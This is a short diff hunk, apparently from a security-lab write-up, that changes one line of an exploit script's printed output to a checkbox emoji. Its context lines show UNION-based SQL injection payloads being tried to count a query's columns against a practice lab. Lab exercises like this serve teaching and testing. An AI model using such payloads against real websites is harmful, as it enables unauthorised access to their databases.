@@ -21,5 +21,5 @@
 [*] Trying payload: ' UNION SELECT null, null-- -
 [*] Trying payload: ' UNION SELECT null, null, null-- -
 [#] Number of columns: 3
-[#] Check your browser, it should be marked now as solved
+🗹 Check your browser, it should be marked now as solved
 ```
